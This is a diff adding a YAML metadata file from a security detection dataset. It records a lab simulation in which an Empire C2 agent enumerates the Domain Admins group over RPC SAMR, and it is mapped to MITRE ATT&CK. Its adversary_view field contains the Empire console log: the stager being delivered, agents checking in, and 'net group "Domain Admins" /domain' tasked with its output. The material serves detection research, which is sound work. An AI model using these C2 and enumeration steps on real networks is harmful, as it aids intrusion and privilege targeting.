@@ -1,0 +1,72 @@
+title: Empire Shell Net Domain Admins
+id: SDWIN-190518201207
+contributors:
+- Roberto Rodriguez @Cyb3rWard0g
+creation_date: 2019/05/18
+modification_date: 2020/09/20
+platform:
+- Windows
+type: atomic
+tags:
+  - Domain Groups Enumeration
+  - RPC SAMR SamrQueryInformationGroup
+description: |-
+  This dataset represents adversaries enumerating members of domain groups (i.e. Domain Admins) via RPC SAMR interface over SMB. Some of the main RPC methods captured over the network are SamrLookupNamesInDomain (Opnum 17) and SamrQueryInformationGroup (Opnum 20) where there are indicators about the specific group name enumerated.
+attack_mappings:
+  - technique: T1069
+    sub-technique: "002"
+    tactics:
+      - TA0007
+notebooks:
+files:
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/discovery/host/empire_shell_rpc_samr_smb_group_domain_admins_standard_user.zip
+- type: network
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/discovery/network/empire_shell_rpc_samr_smb_group_domain_admins_standard_user.zip
+simulation:
+  environment: Mordor shire
+  tools:
+    - type: C2
+      name: Empire
+      module: shell
+      script:
+  permissions_required:
+    - User 
+  adversary_view: |-
+    (Empire: stager/multi/launcher) > 
+    [*] Sending POWERSHELL stager (stage 1) to 172.18.39.6
+    [*] New agent GM4LN8V9 checked in
+    [+] Initial agent GM4LN8V9 from 172.18.39.6 now active (Slack)
+    [*] Sending agent (stage 2) to GM4LN8V9 at 172.18.39.6
+    agents
+
+    [*] Active agents:
+
+    Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
+    ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
+    A7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            
+    HBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            
+    UF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         6404   5/0.0    2020-09-20 21:28:07  http            
+
+    GM4LN8V9 ps 172.18.39.6     WORKSTATION6      THESHIRE\sbeavers       powershell         5724   5/0.0    2020-09-21 08:05:25  http            
+
+    (Empire: agents) > interact GM4LN8V9
+    (Empire: GM4LN8V9) > shell net group "Domain Admins" /domain
+    [*] Tasked GM4LN8V9 to run TASK_SHELL
+    [*] Agent GM4LN8V9 tasked with task ID 1
+    (Empire: GM4LN8V9) > 
+    The request will be processed at a domain controller for domain theshire.local.
+
+    Group name     Domain Admins
+    Comment        Designated administrators of the domain
+
+    Members
+
+    -------------------------------------------------------------------------------
+    mscott                   pgustavo                 wardog                   
+    The command completed successfully.
+
+    ..Command execution completed.
+
+    (Empire: GM4LN8V9) >
+references:
